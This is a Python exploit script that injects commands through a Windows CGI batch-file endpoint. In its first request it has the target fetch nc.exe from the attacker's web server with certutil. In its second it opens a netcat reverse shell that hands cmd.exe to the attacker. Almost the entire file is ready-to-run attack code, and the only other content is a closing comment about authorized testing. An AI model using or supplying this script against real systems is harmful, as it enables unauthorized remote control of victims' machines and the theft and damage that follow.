#!/usr/bin/env python3
import argparse
import sys
import time
import requests

# **Argument Parser Setup**
parser = argparse.ArgumentParser(description='Initiate a reverse shell to the target.',
                                 formatter_class=argparse.RawTextHelpFormatter,
                                 epilog='''Example:
python script.py -t 192.168.1.100 -a 192.168.1.10 -n 4444
Where:
- 192.168.1.100 is the target IP
- 192.168.1.10 is your (attacker) IP
- 4444 is your Netcat listener port''')

# Adding arguments with shorter flag names
parser.add_argument('-t', '--target', required=True, help='IP address of the target')
parser.add_argument('-p', '--targetPort', default='8080', help='Port on the target (default: 8080)')
parser.add_argument('-s', '--script', default='cmd', help='Script to use for the attack (default: cmd)')
parser.add_argument('-a', '--attackIp', required=True, help='Your (attacker) IP address')
parser.add_argument('-w', '--webServerPort', default='80', help='Your web server port (default: 80)')
parser.add_argument('-n', '--ncListenerPort', required=True, help='Your Netcat listener port')

# Check if any arguments were provided, if not, print usage and example
if len(sys.argv) == 1:
    parser.print_help(sys.stderr)
    sys.exit(1)

# Parsing arguments
args = parser.parse_args()

# **URL Construction**
url_download_nc = f"http://{args.target}:{args.targetPort}/cgi/{args.script}.bat?&&C%3a%5cWindows%5cSystem32%5ccertutil+-urlcache+-split+-f+http%3A%2F%2F{args.attackIp}:{args.webServerPort}%2Fnc%2Eexe+nc.exe"
url_reverse_shell = f"http://{args.target}:{args.targetPort}/cgi/{args.script}.bat?&nc.exe+{args.attackIp}+{args.ncListenerPort}+-e+cmd.exe"

# **Execution**
try:
    requests.get(url_download_nc)
    time.sleep(2)  # Wait for the download to complete
    response = requests.get(url_reverse_shell)
    print(f"Reverse shell initiated: {url_reverse_shell}")
except requests.exceptions.RequestException as e:
    print(f"An error occurred during the request: {e}")

# **Security Notice**
# Use only for authorized testing. Ensure permission to interact with the target system.
